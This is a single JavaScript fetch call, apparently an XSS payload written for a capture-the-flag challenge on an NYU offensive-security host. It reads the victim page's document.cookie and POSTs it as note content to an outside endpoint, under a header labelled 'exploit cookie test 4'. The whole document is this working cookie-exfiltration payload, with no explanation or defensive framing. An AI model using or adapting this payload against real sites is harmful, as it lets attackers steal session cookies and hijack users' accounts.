fetch('http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new', {
  method: 'POST',
  headers: {'Content-Type': 'application/json', 'title': 'exploit cookie test 4'},
  body: JSON.stringify({content: document.cookie, submit: 'save'}),
});
